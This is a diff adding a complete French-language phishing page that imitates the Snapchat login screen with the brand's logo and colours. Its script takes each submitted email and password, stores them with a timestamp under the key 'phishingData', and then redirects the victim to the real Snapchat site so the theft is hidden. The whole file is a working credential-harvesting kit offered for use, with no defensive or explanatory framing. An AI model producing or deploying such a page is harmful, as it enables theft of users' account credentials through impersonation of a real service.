@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="fr" >
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Connexion | Snapchat</title>
+  <style>
+    /* Reset de base */
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+    body {
+      font-family: 'Avenir Next', Avenir, Helvetica, Arial, sans-serif;
+      background-color: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      color: #000;
+    }
+    .container {
+      width: 360px;
+      padding: 40px;
+      border: 1px solid #ddd;
+      border-radius: 10px;
+      box-shadow: 0 8px 24px rgba(0,0,0,0.2);
+    }
+    .logo {
+      display: block;
+      margin: 0 auto 25px;
+      width: 72px;
+      height: 72px;
+      background: url('https://upload.wikimedia.org/wikipedia/en/thumb/c/c4/Snapchat_logo.svg/1200px-Snapchat_logo.svg.png') no-repeat center center;
+      background-size: contain;
+    }
+    h1 {
+      font-weight: 600;
+      font-size: 26px;
+      text-align: center;
+      margin-bottom: 30px;
+      color: #000;
+    }
+    form {
+      display: flex;
+      flex-direction: column;
+    }
+    label {
+      font-size: 14px;
+      margin-bottom: 6px;
+      color: #555;
+    }
+    input[type="email"],
+    input[type="password"] {
+      padding: 12px 15px;
+      margin-bottom: 20px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      font-size: 16px;
+      transition: border-color 0.3s ease;
+    }
+    input[type="email"]:focus,
+    input[type="password"]:focus {
+      border-color: #fffc00;
+      outline: none;
+      box-shadow: 0 0 5px #fffc00;
+    }
+    button {
+      background-color: #fffc00;
+      border: none;
+      border-radius: 6px;
+      padding: 14px 0;
+      font-weight: 600;
+      font-size: 18px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+      color: #000;
+    }
+    button:hover {
+      background-color: #e6e600;
+    }
+    .footer {
+      margin-top: 25px;
+      font-size: 12px;
+      color: #777;
+      text-align: center;
+    }
+    .footer a {
+      color: #fffc00;
+      text-decoration: none;
+      font-weight: 600;
+    }
+    .footer a:hover {
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+  <div class="container" role="main" aria-label="Formulaire de connexion Snapchat">
+    <div class="logo" aria-hidden="true"></div>
+    <h1>Connexion</h1>
+    <form id="loginForm" autocomplete="off" spellcheck="false">
+      <label for="email">Adresse e-mail</label>
+      <input type="email" id="email" name="email" required autocomplete="username" />
+      <label for="password">Mot de passe</label>
+      <input type="password" id="password" name="password" required autocomplete="current-password" />
+      <button type="submit">Se connecter</button>
+    </form>
+    <p class="footer">
+      <a href="https://www.snapchat.com/fr-FR/" target="_blank" rel="noopener noreferrer">Mot de passe oublié ?</a>
+    </p>
+  </div>
+
+  <script>
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+      const email = e.target.email.value.trim();
+      const password = e.target.password.value.trim();
+      const timestamp = new Date().toLocaleString();
+
+      // Sauvegarde en localStorage
+      let data = JSON.parse(localStorage.getItem('phishingData')) || [];
+      data.push({timestamp, email, password});
+      localStorage.setItem('phishingData', JSON.stringify(data));
+
+      // Redirection vers vrai Snapchat
+      window.location.href = 'https://www.snapchat.com/fr-FR/';
+    });
+  </script>
+</body>
+</html>
